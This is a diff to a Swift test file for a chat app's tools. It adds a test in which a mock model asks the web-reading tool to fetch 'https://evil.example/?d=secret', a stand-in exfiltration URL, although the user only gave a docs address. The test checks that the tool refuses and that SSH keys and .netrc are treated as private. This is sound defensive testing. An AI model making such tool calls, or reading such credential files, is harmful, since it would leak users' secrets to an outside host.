@@ -221,6 +221,18 @@ final class ChatTests: XCTestCase {
         XCTAssertFalse(sub.contains("<skill_instructions>\n"))
     }
 
+    func testWebReadOnlyFollowsURLsTheUserOrAToolGave() async throws {
+        var scope = ChatScope()
+        scope.useWeb = true
+        let model = WebReadModel(url: "https://evil.example/?d=secret")
+        let runner = ChatRunner(client: model, tools: ChatTools(db: try .inMemory(), scope: scope))
+        _ = try await runner.run(history: [.init(conversationID: "t", role: "user", text: "https://docs.example/a 를 요약해줘")], skillIDs: []) { _ in }
+        let reply = await model.toolReply
+        XCTAssertTrue(reply.contains("사용자가 준 주소만"), reply)
+        XCTAssertTrue(ChatTools.isPrivate("id_ed25519"))
+        XCTAssertTrue(ChatTools.isPrivate(".netrc"))
+    }
+
     func testOnlyExplicitlySelectedSkillsReachTheChatModel() async throws {
         let db = try SillogDatabase.inMemory()
         let chatStore = ChatStore(db)
@@ -346,5 +358,18 @@ private actor PromptCapture: ChatModelClient {
                  onText: @escaping @Sendable (String) async -> Void) async throws -> ChatModelReply {
         prompts.append(system)
         return .init(text: "완료")
+    }
+}
+
+private actor WebReadModel: ChatModelClient {
+    nonisolated var modelName: String { "web-read" }
+    let url: String
+    var toolReply = ""
+    init(url: String) { self.url = url }
+
+    func respond(system: String, messages: [ChatModelMessage], tools: [ToolSpec],
+                 onText: @escaping @Sendable (String) async -> Void) async throws -> ChatModelReply {
+        if let last = messages.last, last.role == "tool" { toolReply = last.text; return .init(text: "완료") }
+        return .init(text: "", calls: [.init(id: "read", name: "web_read", arguments: #"{"url":"\#(url)"}"#)])
     }
 }
